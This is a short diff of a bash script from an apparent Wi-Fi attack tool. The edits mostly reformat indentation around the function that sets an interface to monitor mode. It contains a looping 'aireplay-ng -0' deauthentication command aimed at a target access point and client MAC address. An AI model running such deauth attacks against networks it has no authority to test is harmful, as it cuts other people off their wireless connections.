@@ -243,7 +243,7 @@ aireplay_attack() {
     #     done
     # else
         # put aireplay deauth packet count here selection!!!!!!!!!!!!!!!!
-        while true; do
+    while true; do
             clear
             echo "*********************"
             echo "[F] A few (25)"
@@ -268,14 +268,13 @@ aireplay_attack() {
                     echo "Invalid choice. Please enter 'f' 'm' or 'c'."
             esac
         done
-        ## TEST
-        printf $packetct
-        ## TEST
-        printf "Setting $INF to station mode.\n"
-        sudo airmon-ng stop $INF > /dev/null 2>&1
-        printf "Setting $ITMP to monitor on channel $CHNL.\n"
-        sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1
-    fi
+    ## TEST
+    printf $packetct
+    ## TEST
+    printf "Setting $INF to station mode.\n"
+    sudo airmon-ng stop $INF > /dev/null 2>&1
+    printf "Setting $ITMP to monitor on channel $CHNL.\n"
+    sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1       
     while true; do
         printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
         aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
